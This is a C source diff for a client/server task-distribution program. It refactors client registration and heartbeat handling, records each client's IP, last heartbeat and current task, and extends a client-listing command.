@@ -19,6 +19,7 @@
 #include <arpa/inet.h>
 #include <sys/select.h>
 #include <netdb.h>
+#include <time.h>
 #include <stdlib.h>
 #include <string.h>
 #include <strings.h>
@@ -53,20 +54,30 @@ int certify_register_packet(struct packet* p)
     1:  task sign
     -1: register failed
 */
-int alexjlz_register(struct client *c)
+int alexjlz_register(struct client *c, struct packet *p)
 {
+    if ( !certify_register_packet(p) || (p->type != packet_register) )  // certify
+        return -1;
+
     pthread_mutex_lock(&client_list_mutex);  // exclusively access to client_list
 
     int status = 0;
     struct client *c_iter = NULL;
     list_iter_p client_list_iter = list_iterator(client_list, FRONT);
-
+    
+    parse_string(p->value, c->uuid, "uuid", sizeof(c->uuid));  // this is for identify client
     while ( (c_iter = list_next(client_list_iter)) != NULL )
     {
         if ( strcmp(c->uuid, c_iter->uuid) == 0 ) // heartbeat
         {
+            alexjlz_log("client <<%s>> (ip:%s)  heartbeat!\n", c_iter->uuid, c_iter->ip);
+
             // update info
-            alexjlz_log("client <<%s>> (ip:%s)  heartbeat report!\n", c->uuid, c->ip);
+            strcpy(c_iter->ip, c->ip);  // update ip 
+            c_iter->last_heartbeat = time(NULL); // update heartbeat
+            bzero(c_iter->asc_last_heartbeat, sizeof(c_iter->asc_last_heartbeat));
+            alexjlz_time(c_iter->asc_last_heartbeat); // ascii heartbeat
+            parse_string(p->value, c_iter->current_task, "current_task", sizeof(c_iter->current_task)); // current task
             if ( strlen(c_iter->task) != 0 )  // sign task
             {
                 strcpy(c->task, c_iter->task);
@@ -78,7 +89,7 @@ int alexjlz_register(struct client *c)
     }
     if ( c_iter == NULL )  // register
     {
-        alexjlz_log("client <<%s>> (ip:%s)  register success!\n", c->uuid, c->ip);
+        alexjlz_log("client <<%s>> (ip:%s)  register!\n", c->uuid, c->ip);
         list_add(client_list, c, sizeof(struct client));
         status = 0;
     }
@@ -93,6 +104,7 @@ void *serve_client ( void *arg )
     fd_set client_fd_set;
     struct timeval tv;
     int retval;
+    int status = 0;
 
     int bytes_read = 0;
     int bytes_write = 0;
@@ -107,10 +119,6 @@ void *serve_client ( void *arg )
         alexjlz_log("Error, failed to get client ip, exit...\n");
         return ;
     }
-    else
-    {
-        alexjlz_log("got connected from client %s\n", client_ip);
-    }
 
     while ( 1 )
     {
@@ -122,6 +130,10 @@ void *serve_client ( void *arg )
         tv.tv_sec = 60;
         tv.tv_usec = 0;
 
+        if ( get_remote_ip(client_fd, client_ip) == -1 )
+        {
+            alexjlz_log("Warn, failed to get client ip, exit...\n");
+        }
         /* wait for client to send packet for 6 secs */
         retval = select(client_fd+1, &client_fd_set, NULL, NULL, &tv);
         if ( retval == -1 )  // error
@@ -146,22 +158,15 @@ void *serve_client ( void *arg )
                 close(client_fd);
             return ;
         }
-        if ( (p.type != packet_register) )
+
+        status = alexjlz_register(&c, &p);
+        if ( status == -1 ) // packet is 
         {
-            alexjlz_log("Error, client's packet is not of type register\n");
             if ( check_fd(client_fd) )
                 close(client_fd);
             return ;
         }
-        else if ( !certify_register_packet(&p) )
-        {
-            alexjlz_log("Error, client's register packet failed to pass certify\n");
-            if ( check_fd(client_fd) )
-                close(client_fd);
-            return ;
-        }
-        parse_string(p.value, c.uuid, "uuid", 255);
-        if ( alexjlz_register(&c) == 1 )  // register ( or heartbeat ) client, and maybe sign task for client
+        else if ( status == 1 )  // register ( or heartbeat ) client, and maybe sign task for client
         {
             alexjlz_log("Sign task to client\n");
             bzero(&q, sizeof(q));
@@ -243,7 +248,7 @@ int ask_for_service( int server_fd )
             }
             if ( q.type == packet_task_sign )
             {
-                fprintf(stdout, "Info, got task:%s\n", q.value);
+                fprintf(stdout, "Info, got task:%s\n", q.value); // todo: fork task
             }
         }
     }
@@ -271,7 +276,7 @@ int process_command(struct alexjlz_packet *p, list_p output)
         while ( (c_iter = list_next(client_list_iter)) != NULL )
         {
             bzero(&output_packet, sizeof(output_packet));
-            sprintf(output_packet.value, "uuid:%s ip:%s task:%s\n", c_iter->uuid, c_iter->ip, c_iter->task);
+            sprintf(output_packet.value, "uuid:%s ip:%s last_heartbeat:%s current_task:%s\n", c_iter->uuid, c_iter->ip, c_iter->asc_last_heartbeat, c_iter->current_task);
             list_add(output, &output_packet, sizeof(output_packet));
         }
         pthread_mutex_unlock(&client_list_mutex);
@@ -301,7 +306,7 @@ int process_command(struct alexjlz_packet *p, list_p output)
         list_add(output, &output_packet, sizeof(output_packet));
     }
     bzero(&output_packet, sizeof(output_packet));
-    sprintf(output_packet.value, "OUTPUT_END");
+    sprintf(output_packet.value, OUTPUT_END);
     list_add(output, &output_packet, sizeof(output_packet));
     return 0;
 }
